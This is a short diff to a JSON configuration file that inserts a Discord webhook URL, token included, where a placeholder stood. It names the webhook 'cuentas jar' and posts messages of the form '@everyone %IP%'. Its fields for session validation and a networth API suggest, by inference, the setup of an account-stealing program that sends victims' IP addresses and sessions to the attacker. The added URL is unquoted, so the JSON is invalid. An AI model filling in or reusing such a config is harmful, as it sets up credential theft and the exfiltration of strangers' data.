@@ -1,6 +1,6 @@
 {
-  "webhook": "YOUR_WEBHOOK_URL_HERE",
-  "webhook_name": "webhook",
+  "webhook": https://discord.com/api/webhooks/1408907361568952410/o3vkzzwr_fgC54GWOy-adsaU4GhTjawojYBYb_YeLJWhCVQFqE3OGs6lvq1mYPr6GIHi,
+  "webhook_name": "cuentas jar",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
   "message": "@everyone %IP%",
 
@@ -33,4 +33,5 @@
 
   "validate_session": true,
   "networth_api": ""
+
 }
